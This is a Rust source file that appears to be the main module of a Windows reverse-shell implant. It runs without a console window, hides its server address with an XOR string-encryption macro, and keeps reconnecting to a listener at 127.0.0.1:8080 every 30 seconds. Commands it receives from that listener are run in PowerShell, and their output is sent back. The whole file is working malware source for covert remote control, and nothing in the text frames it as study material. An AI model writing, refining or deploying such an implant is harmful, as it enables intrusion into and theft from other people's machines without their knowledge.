#![windows_subsystem = "windows"]

use tokio::net::TcpStream;
use xorcrypt::{e, prepare_encryption};

use crate::{
    commands::run_ps,
    models::{read, write},
};
mod commands;
mod models;
prepare_encryption!();

#[tokio::main]
async fn main() {
    let addr = e!("127.0.0.1:8080");
    loop {
        match TcpStream::connect(&addr).await {
            Ok(mut conn) => loop {
                match read(&mut conn).await {
                    Some(cmd) => {
                        if commands::process(&cmd, &mut conn).await.is_ok() {
                            continue;
                        };
                        let command = String::from_utf8(cmd.clone()).unwrap();
                        match command.as_str() {
                            "exit" => {
                                write(&mut conn, b"::EOF::".to_vec()).await.unwrap();
                                break;
                            }
                            _ => {
                                let output = run_ps(command).await;
                                if write(&mut conn, output).await.is_err() {
                                    break;
                                }
                            }
                        }
                    }
                    None => {
                        continue;
                    }
                }
            },
            Err(_) => {
                std::thread::sleep(std::time::Duration::from_secs(30));
                continue;
            }
        }
    }
}
